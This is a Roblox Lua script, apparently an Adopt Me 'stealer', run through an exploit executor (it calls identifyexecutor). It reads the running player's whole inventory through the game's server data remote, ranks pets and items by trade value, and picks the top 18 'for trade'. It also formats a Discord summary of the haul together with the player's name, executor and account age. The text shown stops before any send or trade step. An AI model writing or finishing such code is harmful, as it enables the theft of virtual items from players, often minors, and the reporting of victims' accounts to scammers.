-- 🔥 PET PROPS MULTIPLIER
local PET_PROPS = {
    neon = 4;
    mega_neon = 16;
    flyable = 2;
    rideable = 2;
}

-- 🔥 BASE VALUE
local function getCustomValue(name, rarity)
    local val = VALUE_LIST[name]
    
    if not val then
        if rarity == "legendary" then val = 1 end
        if rarity == "ultra_rare" then val = 0.5 end
    end

    return val or 0
end

-- 🔥 PET FINAL VALUE (MULTIPLIER)
local function getPetFinalValue(data, props)
    local base = getCustomValue(data.name, string.lower(data.rarity or ""))
    if base <= 0 then return 0 end

    local multi = 1
    for k,v in pairs(PET_PROPS) do
        if props[k] then
            multi *= v
        end
    end

    return base * multi
end

-- 🔥 TAG SYSTEM
local function getTag(p)
    if p.mega_neon then return "[M]" end
    if p.neon then return "[N]" end
    if p.flyable and p.rideable then return "[FR]" end
    if p.flyable then return "[F]" end
    if p.rideable then return "[R]" end
    return ""
end

-- 🔥 INVENTORY
local serverData = RouterClient.get("DataAPI/GetAllServerData"):InvokeServer()
local inv = serverData[LocalPlayer.Name].inventory

local hits = {}

-- 🔍 SCAN
local function scan(category, db)
    if not inv[category] then return end

    for uid, item in pairs(inv[category]) do
        local data = db and db[item.id]
        if data and data.name then
            
            local props = item.properties or {}
            local val = 0

            if category == "pets" then
                val = getPetFinalValue(data, props)
            else
                val = getCustomValue(data.name, string.lower(data.rarity or ""))
            end

            if val > 0 then
                table.insert(hits,{
                    name = data.name,
                    value = val,
                    uid = uid,
                    props = props,
                    tag = (category == "pets") and getTag(props) or ""
                })
            end
        end
    end
end

-- 🔥 SCAN ALL
scan("pets", InventoryDB.pets)
scan("pet_accessories", InventoryDB.pet_accessories)
scan("food", InventoryDB.food)
scan("toys", InventoryDB.toys)
scan("vehicles", InventoryDB.vehicles)

-- 🔥 GROUPING
local grouped = {}

for _,v in ipairs(hits) do
    local key = v.name .. v.value .. v.tag

    if not grouped[key] then
        grouped[key] = {
            name = v.name,
            value = v.value,
            count = 0,
            tag = v.tag
        }
    end

    grouped[key].count += 1
end

local groupedList = {}
for _,v in pairs(grouped) do
    table.insert(groupedList,v)
end

-- 🔥 SORT BY TOTAL VALUE
table.sort(groupedList,function(a,b)
    return (a.value * a.count) > (b.value * b.count)
end)

-- 🔥 TOP 18 (UNTUK TRADE)
local function getTopHits()
    local selected = {}
    local used = 0

    for _,g in ipairs(groupedList) do
        for _,v in ipairs(hits) do
            if v.name == g.name and v.value == g.value and v.tag == g.tag then
                table.insert(selected,v)
                used += 1
                if used >= 18 then return selected end
            end
        end
    end

    return selected
end

-- 🔥 PLAYER INFO
local playerName = LocalPlayer.Name
local executor = identifyexecutor and identifyexecutor() or "Unknown"
local accountAge = LocalPlayer.AccountAge

-- 🔥 FORMAT DISCORD LIST
local previewLines = {}

for i,v in ipairs(groupedList) do
    if i > 15 then break end

    local total = v.value * v.count
    local tagText = v.tag ~= "" and (" "..v.tag) or ""

    table.insert(previewLines,
        "x"..v.count..tagText.." "..v.name..
        " → "..string.format("%.2f", v.value)..
        " (Total: "..string.format("%.2f", total)..")"
    )
end

-- 🔥 TOTAL VALUE
local totalValue = 0
for _,v in ipairs(groupedList) do
    totalValue += (v.value * v.count)
end

